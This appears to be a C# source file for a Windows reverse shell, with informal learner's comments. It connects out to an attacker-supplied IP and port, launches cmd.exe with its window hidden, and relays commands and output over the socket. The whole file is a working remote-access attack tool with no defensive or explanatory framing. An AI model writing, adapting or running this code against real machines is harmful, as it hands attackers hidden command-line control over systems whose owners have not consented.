//hopefully more functions one day
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace LessSimpleReverseShell
{
	class Program
	{
		static void Main(string[] args)
		{
			Console.WriteLine("thingy.exe [attacker ip] [attacker listener port]");
			if (args.Length != 2)
			{
				Console.WriteLine("thingy.exe [attacker ip] [attacker listener port]");
			}
			else
			{
				String attackerIP = args[0];
				int attackerPort = Convert.ToInt32(args[1]);
				using (TcpClient client = new TcpClient(attackerIP, attackerPort)) //create a callback to attacker
				{
					using (Stream stream = client.GetStream()) //byte data stream?
					{
						using (StreamReader rdr = new StreamReader(stream)) //parsing to the data to readable text?
						{
							StreamWriter writer = new StreamWriter(stream);

							StringBuilder strInput = new StringBuilder();
							StringBuilder strOutput = new StringBuilder();

							Process p = new Process();
							p.StartInfo.FileName = "cmd.exe"; //currently all windows stuff
							p.StartInfo.CreateNoWindow = true; //silent process i think
							p.StartInfo.UseShellExecute = false; //is not spawning separate processes to do this stuff (as far as i understood documentatino)
							p.StartInfo.RedirectStandardOutput = true; //attacker sees all
							p.StartInfo.RedirectStandardInput = true;
							p.StartInfo.RedirectStandardError = true;
							p.OutputDataReceived += new DataReceivedEventHandler((sender, e) =>
							{
								strOutput.Clear();
								if (!String.IsNullOrEmpty(e.Data))
								{
									try
									{
										strOutput.Append(e.Data);
										writer.WriteLine(strOutput);
										writer.Flush();
									}
									catch (Exception err) { Console.WriteLine(err); }
								}
							});
							p.Start();
							p.BeginOutputReadLine();

							while (true)
							{
								strInput.Append(rdr.ReadLine());
								//strInput.Append("\n");  orig author left here, probably was functioning as a submit thing
								p.StandardInput.WriteLine(strInput);
								strInput.Remove(0, strInput.Length); //clearing the prompt?
							}
						}
					}

				}
			}
		}
	}
}
